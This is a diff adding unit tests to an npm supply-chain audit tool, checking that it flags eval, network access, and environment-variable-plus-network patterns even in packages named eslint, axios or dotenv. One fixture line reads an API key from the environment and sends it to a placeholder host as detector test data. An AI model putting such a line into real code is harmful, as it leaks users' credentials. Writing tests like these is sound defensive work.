@@ -445,6 +445,31 @@ describe('code analysis', () => {
     }
   });
 
+  it('should detect eval usage even for package names that previously had soft allowlists', () => {
+    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
+    const pkgDir = path.join(tempDir, 'eslint');
+    fs.mkdirSync(pkgDir, { recursive: true });
+
+    const jsFile = path.join(pkgDir, 'index.js');
+    fs.writeFileSync(jsFile, 'eval("dangerous");');
+
+    const pkg = {
+      name: 'eslint',
+      version: '1.0.0',
+      scripts: {},
+      dir: pkgDir,
+      relativePath: 'eslint',
+    };
+
+    try {
+      const issues = analyzePackage(pkg, { lockPresent: false }, { scanCode: true });
+      const evalIssue = issues.find(i => i.reason === 'eval_usage');
+      assert.ok(evalIssue, 'Should detect eval usage regardless of package name');
+    } finally {
+      fs.rmSync(tempDir, { recursive: true });
+    }
+  });
+
   it('should ignore eval-like pattern in string when apostrophe appears in comment', () => {
     const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
     const pkgDir = path.join(tempDir, 'test-pkg');
@@ -628,6 +653,32 @@ describe('code analysis', () => {
     }
   });
 
+  it('should detect network access for network-oriented package names', () => {
+    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
+    const pkgDir = path.join(tempDir, 'axios');
+    fs.mkdirSync(pkgDir, { recursive: true });
+
+    const jsFile = path.join(pkgDir, 'index.js');
+    fs.writeFileSync(jsFile, 'fetch("https://example.com/data");');
+
+    const pkg = {
+      name: 'axios',
+      version: '1.0.0',
+      scripts: {},
+      dir: pkgDir,
+      relativePath: 'axios',
+    };
+
+    try {
+      const issues = analyzePackage(pkg, { lockPresent: false }, { scanCode: true });
+      const networkIssue = issues.find(i => i.reason === 'node_network_access');
+      assert.ok(networkIssue, 'Should detect network access regardless of package name');
+      assert.ok(['low', 'medium'].includes(networkIssue.severity));
+    } finally {
+      fs.rmSync(tempDir, { recursive: true });
+    }
+  });
+
   it('should detect env access with network when scanCode is enabled', () => {
     const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
     const pkgDir = path.join(tempDir, 'test-pkg');
@@ -649,6 +700,31 @@ describe('code analysis', () => {
       const envNetworkIssue = issues.find(i => i.reason === 'env_with_network');
       
       assert.ok(envNetworkIssue, 'Should detect env access with network');
+    } finally {
+      fs.rmSync(tempDir, { recursive: true });
+    }
+  });
+
+  it('should detect env plus network capability for config-oriented package names', () => {
+    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
+    const pkgDir = path.join(tempDir, 'dotenv');
+    fs.mkdirSync(pkgDir, { recursive: true });
+
+    const jsFile = path.join(pkgDir, 'index.js');
+    fs.writeFileSync(jsFile, 'const key = process.env.API_KEY; fetch("https://x.test?q=" + key);');
+
+    const pkg = {
+      name: 'dotenv',
+      version: '1.0.0',
+      scripts: {},
+      dir: pkgDir,
+      relativePath: 'dotenv',
+    };
+
+    try {
+      const issues = analyzePackage(pkg, { lockPresent: false }, { scanCode: true });
+      const envIssue = issues.find(i => i.reason === 'env_with_network');
+      assert.ok(envIssue, 'Should detect env+network patterns regardless of package name');
     } finally {
       fs.rmSync(tempDir, { recursive: true });
     }
